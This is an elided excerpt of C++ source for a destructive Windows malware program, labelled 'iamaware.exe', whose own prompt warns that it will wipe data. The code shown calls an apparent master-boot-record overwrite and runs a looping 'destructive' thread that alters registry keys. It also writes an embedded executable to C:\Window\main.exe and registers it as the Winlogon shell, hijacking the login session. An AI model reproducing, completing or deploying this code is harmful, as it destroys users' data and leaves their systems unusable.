...
// --< Sounds >--
using SndCalc = function<char(DWORD)>;
...
// -< Destructive >-
DWORD WINAPI Remove_Usefull(LPVOID lpParam) {    
    while (true) {
        HKEY hKey;
        DWORD one = 1;
        DWORD two = 2;
...
DWORD WINAPI winlogon(LPVOID lpParam) {
    filesystem::create_directory("C:\\Window");
    std::ofstream outfile("C:\\Window\\main.exe", std::ios::binary);
    outfile.write((const char*)win_exe, win_exelen);
    outfile.close();
    ...
    LPCWSTR data = L"C:\\Window\\main.exe";
    RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (const BYTE*)data, (wcslen(data) + 1) * sizeof(wchar_t));
    return 0;
}
...
int main() {
    ...
    if (MessageBoxW(NULL, 
        L"This program is a malware, it will wipe off your data\nContinue?", 
        L"iamaware.exe By chinawillspyonusa", 
    ...
    RepMBR();
    CreateThread(0, 0, Remove_Usefull, 0, 0, 0);
    Sleep(2500);
    ...
    sound11();
    Sleep(30000);
    CreateThread(0, 0, winlogon, 0, 0, 0);
